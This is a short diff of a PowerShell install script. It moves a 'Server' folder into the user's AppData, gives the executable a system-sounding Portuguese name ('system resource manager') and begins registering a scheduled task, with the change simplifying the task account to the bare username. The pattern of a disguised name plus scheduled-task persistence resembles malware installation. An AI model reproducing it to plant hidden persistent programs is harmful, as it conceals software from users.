@@ -7,14 +7,16 @@ $dest = Join-Path $usrPath "AppData\Local\Server"
 $exec = Join-Path $dest "Gerenciador de recursos do sistema.exe"
 Move-Item "Server" $dest -Force
 
-$realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
-$dmn = if ($realDmn) {
-    (Get-WmiObject Win32_ComputerSystem).Domain
-} else {
-    $env:COMPUTERNAME
-}
+#$realDmn = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
+#$dmn = if ($realDmn) {
+#    (Get-WmiObject Win32_ComputerSystem).Domain
+#} else {
+#    $env:COMPUTERNAME
+#}
 
-$acc = "$dmn\$usr"
+#$acc = "$dmn\$usr"
+$acc = $usr
+
 $tsk = "GerenciadorRecursos"
 
 schtasks.exe /create `
